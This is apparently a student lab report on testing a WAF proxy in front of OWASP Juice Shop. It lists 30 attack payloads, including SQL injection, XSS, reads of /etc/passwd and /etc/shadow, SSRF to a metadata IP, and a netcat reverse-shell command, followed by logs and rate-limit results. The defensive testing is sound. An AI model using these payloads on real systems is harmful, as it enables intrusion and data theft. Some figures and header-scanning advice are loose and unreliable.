# SentinelShield — Practical Submission Report

**Student Name:** \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
**Date:** \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

---

## 1. Methodology

SentinelShield was deployed with Docker in front of the OWASP Juice Shop test
application and reached at `http://localhost:8080`.

| Setting | Value |
|---|---|
| Detection mode | `block` |
| Detection rules | 44 rules across 7 categories |
| Rate limiter (main proxy) | 600 req/min, burst 100 |
| Rate limiter (brute-force test proxy) | 60 req/min, burst 10, empty allowlist |
| Logging | JSONL with timestamp, IP, category |

Three experiments were run and the logs captured:

1. **Normal traffic baseline** — 15 legitimate requests
2. **Attack simulation** — 30 malicious payloads + 3 normal control requests
   (`scripts/test_attacks.sh`)
3. **Brute-force / rate-limiting test** — 40 rapid requests against a dedicated
   proxy with a small token bucket (`scripts/brute_force.sh`)

All raw outputs are in `evidence/` (see the inventory in Section 11).

---

## 2. Attempted Attack Requests and Detection Results

Each payload was sent to the protected proxy. SentinelShield returned HTTP 403
for every malicious request and 200 for every normal request.

| # | Payload | HTTP | Detected by |
|---|---------|------|-------------|
| 1 | `/?id=1'+UNION+SELECT+*+FROM+users--` | 403 | SQLI-001 |
| 2 | `/?username=admin'+OR+'1'='1` | 403 | SQLI-002 |
| 3 | `/?id=1'+OR+1=1--` | 403 | SQLI-002 |
| 4 | `/?id=1'+SLEEP(5)--` | 403 | SQLI-003 |
| 5 | `/?id=1';+DROP+TABLE+users--` | 403 | SQLI-005 |
| 6 | `/?q=<script>alert(1)</script>` | 403 | XSS-001 |
| 7 | `/?q=<img+src=x+onerror=alert(1)>` | 403 | XSS-002 |
| 8 | `/?url=javascript:alert(1)` | 403 | XSS-003 |
| 9 | `/?q=%3Cscript%3Ealert(1)%3C/script%3E` | 403 | XSS-001 |
| 10 | `/?q="+onfocus=alert(1)+` | 403 | XSS-002 |
| 11 | `/?file=../../../etc/passwd` | 403 | LFI-001 |
| 12 | `/?file=/etc/shadow` | 403 | LFI-002 |
| 13 | `/?file=php://filter/convert.base64-encode/resource=index.php` | 403 | LFI-004 |
| 14 | `/?file=c:\boot.ini` | 403 | LFI-005 |
| 15 | `/?file=/var/log/apache/access.log` | 403 | LFI-003 |
| 16 | `/?url=http://127.0.0.1:80` | 403 | SSRF-001 |
| 17 | `/?url=http://169.254.169.254/` | 403 | SSRF-001 |
| 18 | `/?url=http://localhost:3000` | 403 | SSRF-001 |
| 19 | `/?url=http://192.168.1.1/admin` | 403 | SSRF-001 |
| 20 | `/?path=%2e%2e%2f%2e%2e%2fetc/passwd` | 403 | LFI-001 |
| 21 | `/?path=%252e%252e%252fetc/passwd` | 403 | LFI-001 |
| 22 | `/?cmd=1;whoami` | 403 | CMD-001 |
| 23 | `/?cmd=ls+-la` | 403 | CMD-004 |
| 24 | `/?cmd=1&&cat+/etc/passwd` | 403 | CMD-001 |
| 25 | `/?cmd=1|nc+-e+/bin/sh+10.0.0.1+4444` | 403 | CMD-001 |
| 26 | `/?cmd=%24%28whoami%29` | 403 | CMD-001 |
| 27 | `/?cmd=%24%7BIFS%7Dwhoami` | 403 | CMD-004 |
| 28 | `/?cmd=sh+-c+whoami` | 403 | CMD-003 |
| 29 | `/?cmd=cmd.exe+/c+whoami` | 403 | CMD-003 |
| 30 | `/?cmd=1%0a/usr/bin/id` | 403 | CMD-002 |

**Result: 30/30 malicious requests detected and blocked. 0 false positives on
the 3 normal control requests.**

Note: the two Path Traversal payloads (rows 20–21) were caught by the LFI rule
(`LFI-001`) because the traversal patterns overlap. The rule engine reported
the first matching rule as the primary detection.

---

## 3. Allowed / Blocked System Messages

### Allowed (normal request)

```
{"timestamp": "2026-08-08T13:12:18.491368+00:00", "level": "INFO",
 "event": "access", "client_ip": "192.168.65.1", "method": "GET",
 "path": "/cart", "status": 200, "elapsed_ms": 20.69}
```

### Blocked (attack request — three events per attack)

Detection event (which rule matched):

```
{"timestamp": "2026-08-08T13:12:35.386473+00:00", "level": "WARNING",
 "event": "detection", "client_ip": "192.168.65.1", "path": "/",
 "attack_type": "sqli", "rule_id": "SQLI-001"}
```

Block decision event:

```
{"timestamp": "2026-08-08T13:12:35.386687+00:00", "level": "WARNING",
 "event": "block", "client_ip": "192.168.65.1", "path": "/",
 "reason_type": "AttackDetected", "reason": "sqli: SQLI-001"}
```

Request result (HTTP 403 returned to the client):

```
{"timestamp": "2026-08-08T13:12:35.386752+00:00", "level": "INFO",
 "event": "access", "client_ip": "192.168.65.1", "method": "GET",
 "path": "/", "status": 403, "elapsed_ms": 0.99}
```

### Rate limited (HTTP 429)

```
{"timestamp": "2026-08-08T13:12:43.625760+00:00", "level": "INFO",
 "event": "access", "client_ip": "127.0.0.1", "method": "GET",
 "path": "/login", "status": 429, "elapsed_ms": 0.17}
```

---

## 4. Logs With Timestamps, IP Addresses, and Categories

Every event is written as JSONL and always contains a **timestamp**, a
**client IP**, and the **event category** (`attack_type` / `rule_id` for
detections, `status` for access). Full capture:

- `evidence/sentinel-shield.log` — main proxy (normal + attack traffic)
- `evidence/sentinel-shield-rate-demo.log` — brute-force proxy (rate limiting)

Sample detection lines from the log (timestamp, IP, and category are all
present):

```
13:12:35  192.168.65.1  sqli              SQLI-001   (union based)
13:12:35  192.168.65.1  xss               XSS-002    (event handler)
13:12:35  192.168.65.1  lfi               LFI-004    (php wrapper)
13:12:35  192.168.65.1  ssrf              SSRF-001   (internal ip)
13:12:35  192.168.65.1  command_injection CMD-003    (sh -c)
```

---

## 5. Summary Table — Malicious Request Count

| Metric | Count |
|---|---|
| Total requests observed | 50 |
| Legitimate requests allowed (HTTP 200) | 20 |
| Malicious requests blocked (HTTP 403) | 30 |
| Requests rate limited (HTTP 429) | 0 |
| **Attack detection rate** | **30/30 = 100%** |
| False positives (legitimate requests blocked) | 0 |

(The 20 allowed include 15 baseline + 3 control + 2 live `socket.io` polls from
a browser session that were also captured.)

---

## 6. Summary by Attack Category

| Category | Payloads sent | Blocked | Detection rate | Primary rules |
|---|---|---|---|---|
| SQL Injection | 5 | 5 | 100% | SQLI-001, SQLI-002, SQLI-003, SQLI-005 |
| XSS | 5 | 5 | 100% | XSS-001, XSS-002, XSS-003 |
| LFI | 5 | 5 | 100% | LFI-001 … LFI-005 |
| SSRF | 4 | 4 | 100% | SSRF-001 |
| Path Traversal | 2 | 2 | 100% | LFI-001 (rule overlap) |
| Command Injection | 9 | 9 | 100% | CMD-001 … CMD-004 |
| **Total** | **30** | **30** | **100%** | |

Some payloads matched more than one rule, so the log contains more detection
events than attack requests (e.g. `command_injection` produced 17 rule-level
detections for 9 payloads). The per-request primary rule is what's shown above.

---

## 7. Repeatedly Flagged IP Addresses

| IP | Requests | Notes |
|---|---|---|
| `192.168.65.1` | 50 | All main-proxy traffic (Docker bridge) |
| `127.0.0.1` | 40 | All brute-force traffic (rate-limit proxy) |

Every request came from the same source IP because the Docker container
network-maps client connections to the bridge gateway. On a real deployment
each client would have its own IP, and the repeated-IP aggregation would
identify specific abusers. The brute-force experiment shows exactly this
pattern: one IP flooding `/login` repeatedly.

---

## 8. Explanation of Behavior Analysis and Rate Limiting

### Setup

A dedicated proxy was started with a small token bucket so the effect is
visible in a short run: `burst_size: 10`, `requests_per_minute: 60`
(1 token/sec refill), and an **empty allowlist** so the local client was not
exempted. 40 rapid requests (0.05s apart) were sent to `/login`.

### Results

```
Allowed: 12
Blocked: 28   (all HTTP 429)
Rate limiter triggered after 12 requests.
```

| Metric | Value |
|---|---|
| Total requests sent | 40 |
| Allowed | 12 |
| Blocked (429) | 28 |
| Requests before first block | 10 (the burst size) |
| `RateLimitExceeded` log events | 28 |

### Behavior observed

- The first **10** requests were allowed instantly — they consumed the 10-token
  burst.
- After the burst, requests were rejected with **429** because the bucket was
  empty (1 token/sec refill, but 20 requests/sec were arriving).
- Every ~1 second one request slipped through (rows at `13:12:43` and
  `13:12:44` in `evidence/rate_limit_table.md`) when a refill token arrived —
  a textbook token-bucket pattern.
- Effective throughput was throttled from 20 req/sec down to ~1 req/sec, which
  would make a credential-stuffing attack impractically slow.

---

## 9. Interpretation Notes

_(First draft — please read through and reword so it's in your own words.)_

Overall the WAF behaved as expected. Every single attack payload was caught and
returned 403, and none of the normal requests were blocked, so the rule set is
both sensitive and precise for these test cases. The detection reasons in the
log matched the attack type I sent (SQL injection payloads were flagged as
`sqli`/`SQLI-xxx`, XSS payloads as `xss`/`XSS-xxx`, and so on), which shows the
log is actually usable for forensics, not just a counter.

Two things stood out. First, the rules overlap: my two Path Traversal payloads
were reported as `LFI-001` instead of a `PT-xxx` rule. That's not a miss — the
traversal signature lives in the LFI rule too — but it means one attack can
generate several detection events and you have to decide which is the "primary"
one. Second, during an earlier setup pass I found the SSRF rule was flagging the
site's own `Referer` header (which points at `127.0.0.1`), so legitimate page
assets were being blocked. I fixed that by excluding the `Referer`/`Origin`
headers from the header scan and confirmed everything loaded again. It was a
good reminder that signature rules need tuning against real traffic, not just
test payloads.

The rate limiter demo was the clearest result: burst, then steady 429s, with
occasional tokens letting one request through each second. It made the token
bucket algorithm visible in real time. One practical note: on the Docker setup
all traffic shows as the bridge gateway IP, so per-IP aggregation isn't very
interesting locally — it only becomes meaningful on a real network.

---

## 10. Security Recommendations

_(First draft — please read through and reword so it's in your own words.)_

1. **Move rate limiting to the application/IP level with a persistent store.**
   The in-memory token bucket works per process, so it is not shared across
   instances and resets on restart. A Redis-backed limiter would give
   consistent throttling in a multi-instance deployment (the project docs list
   this as a known limitation and it showed up during testing).

2. **Keep tuning the signature rules against legitimate traffic.** The SSRF
   `Referer` false positive is a concrete example: header scanning must ignore
   or normalize headers the client fully controls (like `Referer`/`Origin`),
   otherwise a site running on a private address can block its own users. This
   should be tested with a real browser session, not just curl.

3. **Log and alert on repeated-IP patterns, not just single detections.** The
   brute-force run shows that an attacker triggers hundreds of 429s/403s from
   one source. A rule that counts repeated failures per IP per window (and
   raises a higher-severity alert or temporarily blocks the IP) would turn the
   raw logs into an actionable response. Correlation is what made the data
   readable here, and it should be automatic.

4. **Set the production rate-limiter budget from real page-load behavior.**
   A single page request pulls dozens of assets, so a burst of 10 blocked a
   normal page load in my testing. Choose `burst_size`/`requests_per_minute`
   from measured traffic, or exempt static assets, so the limiter targets
   state-changing endpoints instead of asset downloads.

---

## 11. Evidence File Inventory

| File | Contents |
|---|---|
| `evidence/normal_traffic.log` | 15 baseline requests, all HTTP 200 |
| `evidence/test_attacks.log` | 30 attack + 3 control results (33/33 pass) |
| `evidence/brute_force.log` | Rate-limit run: 12 allowed / 28 blocked |
| `evidence/sentinel-shield.log` | Full JSONL capture (main proxy) |
| `evidence/sentinel-shield-rate-demo.log` | Full JSONL capture (rate-limit proxy) |
| `evidence/requests_table.md` | Per-request analysis of the main log |
| `evidence/rate_limit_table.md` | Per-request analysis of the rate-limit log |
| `evidence/report.md` | `sentinel-shield report` output (main log) |
| `evidence/rate_limit_report.md` | `sentinel-shield report` output (rate log) |
